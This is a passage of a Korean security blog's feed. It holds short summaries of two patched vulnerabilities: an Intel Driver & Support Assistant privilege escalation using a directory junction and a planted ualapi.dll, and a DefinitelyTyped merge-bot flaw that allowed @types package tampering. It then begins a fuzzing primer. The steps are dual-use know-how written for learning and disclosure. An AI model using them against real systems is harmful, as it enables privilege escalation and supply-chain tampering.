    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://bohops.com/2021/08/07/cve-2021-0090-intel-driver-support-assistant-dsa-elevation-of-privilege-eop/">CVE-2021-0090: INTEL DRIVER &amp; SUPPORT ASSISTANT (DSA) ELEVATION OF PRIVILEGE (EOP)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Intel DSA(Driver &amp; Support Assistant)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC778;&#xD154; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC81C;&#xACF5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Intel Driver &amp; Support Assistant (DSA)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD8C;&#xD55C;&#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xB294; &#xC138;&#xBD80; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>DSA &#xD2B8;&#xB808;&#xC774; &#xC544;&#xC774;&#xCF58;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC124;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>&#xAE30;&#xBCF8;&#xAC12;&#xC740; <code>C:\ProgramData\Intel\DSA</code> &#xC774;&#xBA70; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74; DSA &#xC11C;&#xBE44;&#xC2A4;&#xC778; <code>DSAService.exe</code>&#xAC00; &#xAE30;&#xC874; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC0C8;&#xB85C; &#xC124;&#xC815;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD558;&#xC704; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/10/l0ch/2021-08-10/1.png" alt></p></li></ul></li><li><p>&#xACBD;&#xB85C;&#xB97C; <code>c:\test</code> &#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xB4A4; &#xD558;&#xC704; <code>Downloads</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; <code>c:\windows\System32</code> &#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; Directory Junction&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/10/l0ch/2021-08-10/2.png" alt></p></li><li><p><code>Download</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; payload&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xCEF4;&#xD30C;&#xC77C;&#xD55C; <code>ualapi.dll</code> &#xD30C;&#xC77C;&#xC744; &#xBC30;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>ualapi.dll</code>&#xC740; Windows Spooler &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC758;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xC2DC;&#xC791; &#xC2DC;&#xAC04;(&#xC7AC;&#xBD80;&#xD305; &#xD6C4;)&#xC5D0; &#xB85C;&#xB4DC;&#xB429;&#xB2C8;&#xB2E4;. </li></ul></li><li><p>&#xB2E4;&#xC2DC; DSA&#xC758; &#xC124;&#xC815;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; <code>C:\temp</code> &#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>DSA &#xC11C;&#xBE44;&#xC2A4;&#xAC00; <code>c:\test</code>&#xC5D0;&#xC11C; <code>c:\temp</code>&#xB85C; &#xD558;&#xC704; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC62E;&#xAE30;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Junction&#xC73C;&#xB85C; &#xC778;&#xD574;  <code>Download</code>&#xC758; <code>ualapi.dll</code>&#xC744; <code>c:\windows\System32</code> &#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xCF1C; &#xAE30;&#xC874;&#xC758; &#xC815;&#xC0C1;&#xC801;&#xC778; <code>ualapi.dll</code>&#xC744; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC7AC;&#xBD80;&#xD305;&#xD558;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xD30C;&#xC77C;&#xB85C; &#xB300;&#xCCB4;&#xB41C; <code>ualapi.dll</code>&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2020&#xB144; 10&#xC6D4; &#xC81C;&#xBCF4;&#xB418;&#xC5B4; 2021&#xB144; 6&#xC6D4;&#xC5D0; &#xC778;&#xD154;&#xC774; &#xD328;&#xCE58;&#xB97C; &#xB9B4;&#xB9AC;&#xC988;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>eop</tag>
      
      <tag>intel</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Tampering with arbitrary packages in @types scope of npm</title>
    <link href="/2021/08/09/fabu1ous/2021-08-09/"/>
    <url>/2021/08/09/fabu1ous/2021-08-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ryotak.me/post/definitelytyped-tamper-with-arbitrary-packages-en/">Tampering with arbitrary packages in @types scope of npm</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p><a href="https://github.com/DefinitelyTyped">Definitely typed</a></p><p>dt-mergebot</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Definitely Typed&#xC758; pull request &#xAD00;&#xB9AC; bot&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Definitely typed&#xB294; @type scope &#xC18D; npm &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB85C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC545;&#xC131; pull request&#xB97C; merge &#xD574; @type scope&#xC18D; &#xC784;&#xC758;&#xC758; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; dt-mergebot&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>pull request&#xB85C;&#xBD80;&#xD130; &#xBCC0;&#xD654;&#xB41C;(changes) &#xD30C;&#xC77C;&#xC744; fetch</li><li>&#xD328;&#xD0A4;&#xC9C0;&#xC5D0; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li><li>&#xD328;&#xD0A4;&#xC9C0; &#xAD00;&#xB9AC;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xACE0;</li><li>&#xD328;&#xD0A4;&#xC9C0; &#xAD00;&#xB9AC;&#xC790;&#xAC00; &#xC2B9;&#xC778;&#xD558;&#xBA74; &#xD574;&#xB2F9; pull request&#xB294; merge &#xAD8C;&#xD55C; &#xBD80;&#xC5EC;</li><li>pull request &#xC791;&#xC131;&#xC790;&#xAC00; <code>Ready to merge</code> &#xCF54;&#xBA58;&#xD2B8;&#xB97C; &#xB2EC;&#xBA74; merge &#xC218;&#xD589;</li></ol><p>&#xBB38;&#xC81C;&#xB294; dt-mergebot&#xC774; pull request&#xC758; merge&#xAD8C;&#xD55C;&#xC744; &#xACC4;&#xC0B0;&#xD560; &#xB54C; &#xCCAB; 100&#xAC1C;&#xC758; file&#xB9CC;&#xC744; fetch &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 101&#xAC1C; &#xC774;&#xC0C1;&#xC758; changes&#xAC00; &#xC788;&#xB294; pull request&#xB294; 101 &#xBC88;&#xC9F8; &#xD30C;&#xC77C;&#xBD80;&#xD130; &#xAD8C;&#xD55C; &#xAC80;&#xC0AC; &#xB300;&#xC0C1;&#xC5D0;&#xC11C; &#xC81C;&#xC678;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs GraphQL">query PR($pr_number: Int!) {    repository(owner: &quot;DefinitelyTyped&quot;, name: &quot;DefinitelyTyped&quot;) {      id      pullRequest(number: $pr_number) {        [...]        files(first: 100) {          totalCount          nodes {            path            additions            deletions          }        }        [...]      }   }}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>npm</tag>
      
      <tag>package</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 퍼징 교양 수업 fuzz 101 - part1</title>
    <link href="/2021/08/08/fabu1ous/fuzz-1/"/>
    <url>/2021/08/08/fabu1ous/fuzz-1/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; Fabu1ous&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xCD5C;&#xADFC;&#xC5D0; &#xC62C;&#xB9B0; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xBAA8;&#xB450; &#xD37C;&#xC800;&#xC5D0; &#xB300;&#xD55C; &#xAE00;&#xC774;&#xC5C8;&#xC8E0;? &#xD37C;&#xC9D5;&#xC758; &#xAC1C;&#xB150;&#xC740; &#xB9E4;&#xC6B0; &#xB2E8;&#xC21C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xAE30;&#xC220; &#xC911; &#xB192;&#xC740; &#xC778;&#xAE30;&#xB97C; &#xC720;&#xC9C0; &#xC911;&#xC774;&#xBA70; &#xAFB8;&#xC900;&#xD788; &#xC5F0;&#xAD6C;&#xB418;&#xB294; &#xBD84;&#xC57C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xAC1C;&#xB150;&#xB9CC; &#xB2E8;&#xC21C;&#xD560; &#xBFD0; &#xD37C;&#xC9D5;&#xC758; &#xD6A8;&#xC728; &#xD5A5;&#xC0C1;&#xC744; &#xC704;&#xD55C; &#xC5F0;&#xAD6C;&#xB4E4;&#xC744; &#xD558;&#xB098;&#xD558;&#xB098; &#xC0B4;&#xD3B4;&#xBCF8;&#xB2E4;&#xBA74; &#xB300;&#xB2E8;&#xD788; &#xBC29;&#xB300;&#xD558;&#xACE0; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD37C;&#xC9D5; &#xBD84;&#xC57C;&#xC758; &#xACF5;&#xBD80;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB531; &#xC54C;&#xB9DE;&#xC740; &#xB17C;&#xBB38;&#xC774; &#xC788;&#xC5B4; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC120; &#xD37C;&#xC9D5;&#xC758; &#xAE30;&#xBCF8; &#xAC1C;&#xB150;&#xACFC; &#xC6A9;&#xC5B4;, &#xADF8;&#xB9AC;&#xACE0; &#xD37C;&#xC800;&#xC758; &#xBD84;&#xB958;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a></p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>1990&#xB144;&#xB300; fuzzing&#xC774;&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xAC00; &#xCC98;&#xC74C; &#xC0AC;&#xC6A9;&#xB41C; &#xC774;&#xD6C4;, &#xD37C;&#xC9D5;&#xC740; exploit generation&#xACFC; penetration testing &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9;&#xBC95;&#xC5D0; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD788; Attacker&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB9CC;&#xC774; &#xC544;&#xB2C8;&#xB77C; Defender&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C; &#xB2E8;&#xACC4;&#xBD80;&#xD130; &#xD37C;&#xC9D5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xD37C;&#xC9D5; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0;&#xB294; &#xC815;&#xB9D0; &#xBC29;&#xB300;&#xD55C;&#xB370;, &#xAE43;&#xD5D9;&#xC5D0;&#xB9CC; &#xD37C;&#xC9D5;&#xC5D0; &#xB300;&#xD55C; &#xD37C;&#xBE14;&#xB9AD; &#xB808;&#xD3EC;&#xAC00; &#xCC9C; &#xAC1C; &#xC774;&#xC0C1; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/08/fabu1ous/fuzz-1/2.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xBC29;&#xB300;&#xD55C; &#xBD84;&#xC57C;&#xB97C; &#xD558;&#xB098;&#xD558;&#xB098; &#xB530;&#xB77C;&#xAC00;&#xAE30; &#xC27D;&#xC9C0; &#xC54A;&#xC744;&#xBFD0;&#xB354;&#xB7EC; &#xAC01; &#xD37C;&#xC800;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xAC70;&#xB098; &#xD5A5;&#xC0C1;&#xB41C; &#xAE30;&#xB2A5; &#xB4F1;&#xC744; &#xB73B;&#xD558;&#xB294; &#xC6A9;&#xC5B4;&#xB4E4;&#xC774; &#xD558;&#xB098;&#xB85C; &#xD655;&#xB9BD;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xBA74; AFL&#xC758; &#x201C;test case minimization&#x201D;&#xACFC; funfuzz&#xC758; &#x201C;test case reduction&#x201D;&#xC758; &#xACBD;&#xC6B0; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xC11C;&#xB85C; &#xB2E4;&#xB974;&#xAC8C; &#xBD80;&#xB974;&#xACE0; &#xC788;&#xC8E0;. &#xB610;&#xD55C; BFF&#xC758; &#x201C;crash minimization&#x201D;&#xACFC; &#xAC19;&#xC774; &#xC774;&#xB984;&#xC740; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC791;&#xC774; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7A5;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xBCFC; &#xB54C; &#xC774;&#xB7F0; &#xD604;&#xC0C1;&#xC740; &#xD37C;&#xC9D5; &#xC5F0;&#xAD6C;&#xC758; &#xC7A5;&#xC560;&#xBB3C;&#xC774; &#xB420; &#xAC83;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD574;, &#xBCF8; &#xB17C;&#xBB38;&#xC744; &#xD1B5;&#xD574; &#xD37C;&#xC9D5;&#xC744; &#xBD84;&#xB958;&#xD558;&#xACE0; &#xD1B5;&#xC77C;&#xB41C; &#xBAA8;&#xB378;&#xC744; &#xC81C;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="2-Systemization-Taxonomy-Test-Programs"><a href="#2-Systemization-Taxonomy-Test-Programs" class="headerlink" title="2. Systemization, Taxonomy, Test Programs"></a>2. Systemization, Taxonomy, Test Programs</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/3.png" alt></p><blockquote><p>generates a stream of random characters to be consumed by a target program</p><p>-Miller-</p></blockquote><p>&#x201C;fuzz&#x201D;&#xB77C;&#xB294; &#xB2E8;&#xC5B4;&#xB294; 1990&#xB144; &#xCC98;&#xC74C; &#xC704;&#xC640; &#xAC19;&#xC740; &#xC758;&#xBBF8;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4;&#xB85C; fuzz&#xC640; fuzzing&#xC758; &#xAC1C;&#xB150; &#xBC0F; &#xB3D9;&#xC791;&#xC774; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xD30C;&#xC0DD;&#xB418;&#xC5B4; &#xD63C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <s>&#xC77C;&#xB809;&#xAE30;&#xD0C0; &#xC774;&#xD399;&#xD130; &#xD398;&#xB2EC;&#xC911;&#xC5D0; fuzz&#xB77C;&#xB294; &#xB188;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</s></p><ul><li><p>dynamic symbolic execution</p></li><li><p>grammarbased test case generation</p></li><li><p>permission testing</p></li><li><p>behavioral testing</p></li><li><p>complexity testing</p></li><li><p>kernel testing</p></li><li><p>representation dependence testing</p></li><li><p>function detection</p></li><li><p>robustness evaluation</p></li><li><p>exploit development</p></li><li><p>GUI testing</p></li><li><p>signature generation</p></li><li><p>penetration testing</p></li></ul><h2 id="2-1-fuzzing-amp-fuzz-testing"><a href="#2-1-fuzzing-amp-fuzz-testing" class="headerlink" title="2.1 fuzzing &amp; fuzz testing"></a>2.1 fuzzing &amp; fuzz testing</h2><p>&#xB530;&#xB77C;&#xC11C; &#xC880; &#xB354; &#xCCB4;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6A9;&#xC5B4;&#xB97C; &#xBA3C;&#xC800; &#xC815;&#xC758;&#xD569;&#xC2DC;&#xB2E4;.</p><p>&#xD37C;&#xC9D5; &#xB3D9;&#xC791;&#xC774;&#xB780; &#x201C;fuzz input&#x201D;&#xC744; &#xC0AC;&#xC6A9;&#xD574; PUT(Program Under Test)&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xACE0;, &#x201C;fuzz input&#x201D;&#xC774;&#xB780; PUT&#xAC00; &#xC608;&#xC0C1;&#xD558;&#xC9C0; &#xBABB;&#xD560; input&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. PUT&#xC774; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xD558;&#xB294; input &#xD639;&#xC740; &#xAC1C;&#xBC1C; &#xC758;&#xB3C4;&#xC640;&#xB294; &#xB2E4;&#xB978; &#xD589;&#xB3D9;&#xC744; &#xBCF4;&#xC774;&#xB294; input&#xC744; &#xB123;&#xC5B4; PUT&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD574;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; fuzzing&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 1 (Fuzzing) Fuzzing is the execution of the PUT using input(s) sampled from an input space (the &#x201C;fuzz input space&#x201D;) that protrudes the expected input space of the PUT.<br>fuzzing&#xC774;&#xB780; PUT&#xC758; &#xC608;&#xC0C1; &#xAC00;&#xB2A5; &#xC785;&#xB825; &#xACF5;&#xAC04;&#xC744; &#xCD08;&#xACFC;&#xD55C; &#xC785;&#xB825; &#xACF5;&#xAC04;(fuzz &#xC785;&#xB825; &#xACF5;&#xAC04;) &#xC911;&#xC5D0;&#xC11C; &#xC120;&#xBCC4;&#xB41C; &#xC785;&#xB825;&#xC744; PUT&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;</p></blockquote><p><img src="/2021/08/08/fabu1ous/fuzz-1/4.png" alt></p><ol><li>fuzz input space&#xAC00; expected input space&#xB97C; &#xD3EC;&#xD568; &#xAC00;&#xB2A5;</li><li>&#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC740; fuzzing&#xC758; &#xD544;&#xC218;&#xC870;&#xAC74;&#xACFC; &#xAC19;&#xC73C;&#xB2C8; &#xAD73;&#xC774; &#xC815;&#xC758;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xB2E4;.(= &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xB3C4; &#xD37C;&#xC9D5;&#xC774;&#xB77C; &#xBD80;&#xB97C; &#xC218; &#xC788;&#xB2E4;)</li><li>sampling &#xC791;&#xC5C5;&#xC740; &#xAF2D; &#xB79C;&#xB364; &#xD558;&#xC9C0; &#xC54A;&#xB2E4;. (= &#xAF2D; &#xB79C;&#xB364; &#xC778;&#xD48B;&#xC744; &#xB123;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xB2E4;)</li></ol><p>Fuzz testing&#xC744; fuzzing &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC80;&#xC0AC; &#xAE30;&#xC220;&#xC774;&#xB77C;&#xACE0; &#xC815;&#xC758;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC80;&#xC0AC; &#xAE30;&#xC220;&#xACFC; fuzzing&#xC758; &#xAC00;&#xC7A5; &#xD070; &#xCC28;&#xBCC4;&#xC810;&#xC740; &#xBC14;&#xB85C; &#xBAA9;&#xC801;&#xC131;&#xC785;&#xB2C8;&#xB2E4;. fuzzing&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC740; crash&#xC640; &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xBC84;&#xADF8; &#xD0D0;&#xC0C9;&#xC774;&#xBBC0;&#xB85C; &#xBE44;&#xC2B7;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xC9C0;&#xB9CC; &#xBAA9;&#xC801;&#xC774; &#xB2E4;&#xB978; &#xAE30;&#xC220;&#xB4E4;&#xACFC; &#xAD6C;&#xBD84;&#xD558;&#xACE0; &#xAC15;&#xC870;&#xD558;&#xAE30; &#xC704;&#xD574; fuzz testing, fuzzer, fuzz campaign&#xC774;&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 2 (Fuzz Testing) Fuzz testing is the use of fuzzing to test if a PUT violates a security policy.<br>fuzz testing&#xC774;&#xB780; fuzzing &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD574; PUT&#xAC00; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xAC83;</p><p>Definition 3 (Fuzzer) A fuzzer is a program that performs fuzz testing on a PUT. fuzzer&#xB780; PUT&#xC5D0; fuzz testing&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</p><p>Definition 4 (Fuzz Campaign) A fuzz campaign is a specific execution of a fuzzer on a PUT with a specific security policy.<br>fuzz campaign&#xC774;&#xB780; &#xD2B9;&#xC815; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC16;&#xB294; PUT&#xC5D0; &#xB300;&#xD55C; fuzzer&#xC758; &#xD2B9;&#xC815; &#xC2E4;&#xD589;</p></blockquote><p>&#xCD08;&#xCC3D;&#xAE30; &#xD37C;&#xC800;&#xB4E4;&#xC740; test case&#xAC00; PUT&#xC758; crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294;&#xC9C0;&#xB9CC;&#xC744; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; fuzz testing&#xC740; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xAD00;&#xCE21;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC80;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD2B9;&#xC815; &#xC2E4;&#xD589;&#xC774; &#xBCF4;&#xC548;&#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; Bug Oracle&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 5 (Bug Oracle) A bug oracle is a program, perhaps as part of a fuzzer, that determines whether a given execution of the PUT violates a specific security policy.<br>Bug Oracle&#xC774;&#xB780; &#xC81C;&#xACF5;&#xB41C; PUT&#xC758; &#xC2E4;&#xD589;&#xC774; &#xD2B9;&#xC815; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</p></blockquote><p>fuzz algorithm&#xC740; fuzzer&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C; PUT&#xC758; &#xBA87; &#xAC00;&#xC9C0; parameter&#xB4E4;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xBA70; &#xADF8; parameter&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xC815;&#xC744; fuzz configuration&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 6 (Fuzz Configuration) A fuzz configuration of a fuzz algorithm comprises the parameter value(s) that control(s) the fuzz algorithm.<br>Fuzz algorithm&#xC758; Fuzz 